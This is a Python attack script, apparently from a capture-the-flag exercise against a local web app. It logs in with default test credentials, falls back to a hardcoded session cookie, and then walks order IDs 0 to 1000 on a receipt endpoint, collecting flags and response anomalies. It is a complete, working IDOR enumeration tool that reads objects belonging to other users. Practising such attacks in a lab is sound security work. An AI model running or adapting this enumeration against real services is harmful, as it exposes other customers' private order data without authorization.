import requests
import re
import time

# Configuration
base_url = "http://127.0.0.1:32941"
timeout = 5

# Create session
session = requests.Session()

print("Starting authentication process...")

# Step 1: POST to / with credentials
login_data = {
    "username": "test",
    "password": "test"
}

try:
    response = session.post(f"{base_url}/", data=login_data, timeout=timeout)
    print(f"Step 1 - POST to /: Status {response.status_code}")
    print(f"Cookies after step 1: {dict(session.cookies)}")
    
    # Step 2: POST to /password/test
    response2 = session.post(f"{base_url}/password/test", timeout=timeout)
    print(f"Step 2 - POST to /password/test: Status {response2.status_code}")
    print(f"Cookies after step 2: {dict(session.cookies)}")
    
except Exception as e:
    print(f"Authentication error: {e}")
    print("Will attempt enumeration with existing session cookie from context...")

# Check if we have a session cookie
if not session.cookies.get('session'):
    print("No session cookie obtained! Enumeration may fail.")
    # Try using the provided session cookie
    session.cookies.set('session', 'eyJ1c2VyX2lkIjoxMDAzMn0.aVLQrQ.UwvtLfYsm3gR5lOsx-SapY2s4r0')

print("\n" + "="*80)
print(f"Starting enumeration of order_id 0-1000 on /order/{{order_id}}/receipt")
print("="*80 + "\n")

# Variables to track findings
flag_pattern = re.compile(r'FLAG\{[^}]+\}')
found_flags = []
anomalies = []
success_count = 0
not_found_count = 0
same_size_count = 0

# Store response sizes to detect variations
response_sizes = {}

# Enumerate order_id values
for order_id in range(0, 1001):
    url = f"{base_url}/order/{order_id}/receipt"
    
    try:
        response = session.get(url, timeout=timeout)
        size = len(response.content)
        status = response.status_code
        
        # Track size distribution
        size_key = f"{status}_{size}"
        if size_key not in response_sizes:
            response_sizes[size_key] = 0
        response_sizes[size_key] += 1
        
        # Search for FLAG pattern
        flags_found = flag_pattern.findall(response.text)
        if flags_found:
            for flag in flags_found:
                print(f"[!] FLAG FOUND at order_id={order_id}")
                print(f"    Status: {status} | Size: {size}B")
                print(f"    Flag: {flag}")
                print(f"    Full response:\n{response.text}\n")
                found_flags.append({
                    'order_id': order_id,
                    'status': status,
                    'size': size,
                    'flag': flag,
                    'response': response.text
                })
        
        # Track anomalies (not 200 OK)
        if status != 200:
            print(f"[ANOMALY] order_id={order_id} | Status: {status} | Size: {size}B")
            if response.text:
                print(f"    Response preview: {response.text[:200]}\n")
            anomalies.append({
                'order_id': order_id,
                'status': status,
                'size': size,
                'response': response.text
            })
        else:
            success_count += 1
            # For non-flag 200 responses, still check for interesting content
            if 'error' in response.text.lower() or 'fail' in response.text.lower():
                print(f"[INFO] order_id={order_id}: Contains error text but status 200")
                print(f"    Size: {size}B | Text: {response.text[:150]}\n")
    
    except requests.exceptions.Timeout:
        print(f"[TIMEOUT] order_id={order_id} - Request timed out")
    except Exception as e:
        print(f"[ERROR] order_id={order_id} - {e}")

# Summary analysis
print("\n" + "="*80)
print("ENUMERATION SUMMARY")
print("="*80)
print(f"Total tested: 1001 (order_id 0-1000)")
print(f"Successful (200): {success_count}")
print(f"Anomalies (non-200): {len(anomalies)}")
print(f"Timeouts/Errors: {1001 - success_count - len(anomalies)}")

if found_flags:
    print(f"\nFLAGS FOUND: {len(found_flags)}")
    for flag_data in found_flags:
        print(f"  - order_id={flag_data['order_id']}: {flag_data['flag']}")

if anomalies:
    print(f"\nANOMALIES DETECTED:")
    # Group by status code
    status_groups = {}
    for anomaly in anomalies:
        status = anomaly['status']
        if status not in status_groups:
            status_groups[status] = []
        status_groups[status].append(anomaly['order_id'])
    
    for status, ids in status_groups.items():
        print(f"  Status {status}: {len(ids)} occurrences")
        print(f"    Order IDs: {ids[:10]}{'...' if len(ids) > 10 else ''}")

print(f"\nResponse size distribution:")
for size_key, count in sorted(response_sizes.items()):
    print(f"  {size_key}: {count} responses")

# Analyze size variations
if len(response_sizes) > 1:
    print(f"\n[INFO] Multiple response size patterns detected - investigate further")
print("="*80)
